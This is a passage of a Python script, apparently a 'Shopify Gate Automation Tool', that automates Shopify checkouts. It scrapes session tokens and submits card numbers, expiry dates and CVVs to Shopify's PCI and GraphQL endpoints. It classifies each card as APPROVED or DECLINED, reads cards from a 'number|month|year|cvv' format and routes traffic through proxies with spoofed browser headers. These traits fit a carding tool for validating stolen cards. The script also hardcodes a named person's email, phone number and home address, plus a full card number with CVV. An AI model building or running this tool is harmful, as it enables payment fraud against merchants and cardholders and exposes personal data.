                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }

            checkout_data = {
                'checkout': '',
            }

            domain = urlparse(url).netloc
            checkout_url = f"https://{domain}/cart"
            response = await client.post(checkout_url, headers=checkout_headers, data=checkout_data, follow_redirects=True)

            # Extract tokens from checkout page
            checkout_html = response.text
            x_checkout_session_token = find_between(checkout_html, 'serialized-session-token" content="&quot;', '&quot;')
            if not x_checkout_session_token or x_checkout_session_token == "None":
                x_checkout_session_token = find_between(checkout_html, '"serializedSessionToken":"', '"')

            queue_token = find_between(checkout_html, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token or queue_token == "None":
                queue_token = find_between(checkout_html, '"queueToken":"', '"')

            payment_method_identifier = find_between(checkout_html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier or payment_method_identifier == "None":
                payment_method_identifier = find_between(checkout_html, '"paymentMethodIdentifier":"', '"')

            # Step 4: Process credit card with Shopify PCI
            pci_url = "https://checkout.pci.shopifyinc.com/sessions"
            pci_headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
            }

            pci_data = {
                'credit_card': {
                    'number': card_number.replace(' ', ''),
                    'month': int(exp_month),
                    'year': int(exp_year),
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': cardholder_name,
                },
                'payment_session_scope': domain,
            }

            response = await client.post(pci_url, headers=pci_headers, json=pci_data)
            if response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = "Failed to process credit card with Shopify PCI"
                return result

            session_id = response.json().get("id", "")

            # Step 5: Submit payment for completion
            completion_url = f"https://{domain}/checkouts/unstable/graphql"
            completion_headers = {
                'authority': domain,
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f"https://{domain}",
                'referer': f"https://{domain}/",
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': user_agent,
                'x-checkout-one-session-token': x_checkout_session_token,
                'x-checkout-web-build-id': generate_random_code(40),
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': cart_token,
            }

            completion_params = {
                'operationName': 'SubmitForCompletion',
            }

            # Simplified GraphQL query without Receipt type selections
            completion_data = {
                'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename}}',
                'variables': {
                    'input': {
                        'buyerIdentity': {
                            'email': 'mromenxd@gmail.com',
                            'phone': '+917620404467',
                            'countryCode': 'IN',
                        },
                        'payment': {
                            'billingAddress': {
                                'firstName': 'Niteen',
                                'lastName': 'Yadav',
                                'address1': 'Indraprastha Housing Society Phase 1. Plot no. 356. Survey no. 15. BEHIND A. M. COLLEGE',
                                'address2': '',
                                'city': 'Pune',
                                'countryCode': 'IN',
                                'zoneCode': 'MH',
                                'postalCode': '411028',
                                'phone': '+917620404467',
                            },
                            'paymentMethod': {
                                'sessionId': session_id,
                                'paymentMethodIdentifier': payment_method_identifier,
                            },
                        },
                    },
                    'attemptToken': generate_random_code(),
                },
                'operationName': 'SubmitForCompletion',
            }

            response = await client.post(completion_url, headers=completion_headers, params=completion_params, json=completion_data)
            if response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = "Failed to submit payment for completion"
                return result

            completion_data = response.json()

            # Check for errors in the response
            if 'errors' in completion_data:
                error_message = completion_data['errors'][0].get('message', 'Unknown error')
                result["status"] = "DECLINED"
                result["message"] = f"Payment declined: {error_message}"
                return result

            # Check for receipt
            receipt_id = None

            # Try different paths to find receipt ID
            receipt_paths = [
                ['data', 'submitForCompletion', 'receipt', 'id'],
                ['data', 'submitForCompletion', 'receipt', 0, 'id'],  # For array responses
                ['data', 'submitForCompletion', 'id'],
                ['receipt', 'id'],
                ['id']
            ]

            for path in receipt_paths:
                try:
                    current = completion_data
                    for key in path:
                        if isinstance(current, dict) and key in current:
                            current = current[key]
                        elif isinstance(current, list) and isinstance(key, int) and len(current) > key:
                            current = current[key]
                        else:
                            break
                    else:
                        # If we made it through the entire path, we found a receipt ID
                        receipt_id = current
                        break
                except (KeyError, IndexError, TypeError):
                    continue

            if receipt_id:
                result["status"] = "APPROVED"
                result["message"] = f"Payment approved. Receipt ID: {receipt_id}"
                result["receipt_id"] = receipt_id

                # Step 6: Poll for receipt (optional)
                await asyncio.sleep(3)
                poll_url = f"https://{domain}/checkouts/unstable/graphql"
                poll_headers = {
                    'authority': domain,
                    'accept': 'application/json',
                    'accept-language': 'en-US',
                    'content-type': 'application/json',
                    'origin': f"https://{domain}",
                    'referer': f"https://{domain}/",
                    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'shopify-checkout-client': 'checkout-web/1.0',
                    'user-agent': user_agent,
                    'x-checkout-one-session-token': x_checkout_session_token,
                    'x-checkout-web-build-id': generate_random_code(40),
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-server-rendering': 'yes',
                    'x-checkout-web-source-id': cart_token,
                }

                poll_params = {
                    'operationName': 'PollForReceipt',
                }

                poll_data = {
                    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id __typename}...on WaitingReceipt{id __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id __typename}__typename}}',
                    'variables': {
                        'receiptId': receipt_id,
                        'sessionToken': x_checkout_session_token,
                    },
                    'operationName': 'PollForReceipt',
                }

                response = await client.post(poll_url, headers=poll_headers, params=poll_params, json=poll_data)
                if response.status_code == 200:
                    poll_data = response.json()
                    result["poll_result"] = poll_data
            else:
                result["status"] = "UNKNOWN"
                result["message"] = "Payment status unknown"

            return result

    except Exception as e:
        result["status"] = "ERROR"
        result["message"] = f"Payment processing error: {str(e)}"
        return result


async def async_main():
    """Async main function for running with asyncio"""
    parser = argparse.ArgumentParser(description='Shopify Gate Automation Tool (Async Version)')
    parser.add_argument('--url', required=True, help='Shopify store URL')
    parser.add_argument('--proxy', help='Proxy in format: [socks5://][user:pass@]ip:port')
    parser.add_argument('--output', choices=['json', 'pretty'], default='pretty',
                        help='Output format (default: pretty)')
    parser.add_argument('--card', help='Credit card in format: number|exp_month|exp_year|cvv')
    parser.add_argument('--cardholder', default='Test User', help='Cardholder name')

    args = parser.parse_args()

    # Parse credit card information if provided
    card_number = "5544 8445 3967 2801"
    exp_month = 6
    exp_year = 2037
    cvv = "411"

    if args.card:
        card_parts = args.card.split('|')
        if len(card_parts) >= 4:
            card_number = card_parts[0]
            exp_month = card_parts[1]
            exp_year = card_parts[2]
            cvv = card_parts[3]

    # Process payment asynchronously
    result = await process_payment_async(
        url=args.url,
        card_number=card_number,
        exp_month=exp_month,
        exp_year=exp_year,
        cvv=cvv,
        cardholder_name=args.cardholder,
        proxy=args.proxy
    )

    # Output the result
    if args.output == 'json':
        print(json.dumps(result))
    else:
        # Create a simplified version for display
        display_result = {
            "timestamp": result.get("timestamp", ""),
            "url": result.get("url", ""),
            "by": result.get("by", ""),
            "card": result.get("card", ""),
            "status": result.get("status", ""),
            "message": result.get("message", "")
        }

        # Add card result data if available
        if "card_result" in result:
            display_result["card_result"] = result["card_result"]
        elif "raw_response_text" in result:
            display_result["raw_response_text"] = result["raw_response_text"]

        # Add raw response data if card_result is not available
        if "card_result" not in result and "raw_response" in result:
            display_result["raw_response"] = result["raw_response"]

        # Print the simplified result
        print(json.dumps(display_result, indent=2))

        # Save full raw data to file for inspection
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        raw_data_file = f"raw_data_async_{timestamp}.json"
        with open(raw_data_file, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\nFull raw data saved to {raw_data_file}")


if __name__ == "__main__":
    # Check if --async flag is provided
    if '--async' in sys.argv:
        # Remove the --async flag before parsing arguments
        sys.argv.remove('--async')
        # Run the async version
        asyncio.run(async_main())
    else:
        # Run the regular version
        main()
